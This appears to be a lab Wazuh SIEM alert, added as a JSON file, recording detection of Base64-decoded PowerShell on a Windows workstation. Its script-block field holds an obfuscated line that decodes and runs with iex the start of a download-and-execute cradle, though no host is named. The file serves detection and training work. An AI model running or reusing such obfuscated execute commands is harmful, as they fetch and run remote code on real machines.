@@ -1,0 +1,47 @@
+{
+  "id": "EV-A033",
+  "timestamp": "2026-11-11T03:30:18Z",
+  "rule": {
+    "id": "91809",
+    "level": 10,
+    "description": "Powershell script may be using Base64 decoding method",
+    "groups": [
+      "windows",
+      "powershell"
+    ],
+    "mitre": {
+      "id": [
+        "T1140"
+      ]
+    }
+  },
+  "agent": {
+    "id": "002",
+    "name": "lab-ws02",
+    "ip": "10.10.20.16"
+  },
+  "manager": {
+    "name": "lab-wazuh"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "location": "EventChannel",
+  "data": {
+    "win": {
+      "system": {
+        "eventID": "4104",
+        "computer": "lab-ws02.lab.local",
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "providerName": "Microsoft-Windows-PowerShell",
+        "systemTime": "2026-11-11T03:30:18Z"
+      },
+      "eventdata": {
+        "scriptBlockText": "$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp')); iex $s",
+        "scriptBlockId": "7d1c2f0e-0000-4000-8000-000000000033",
+        "path": ""
+      }
+    }
+  },
+  "full_log": "Creating Scriptblock text (1 of 1): FromBase64String(...) followed by iex, run by LAB\\alice."
+}
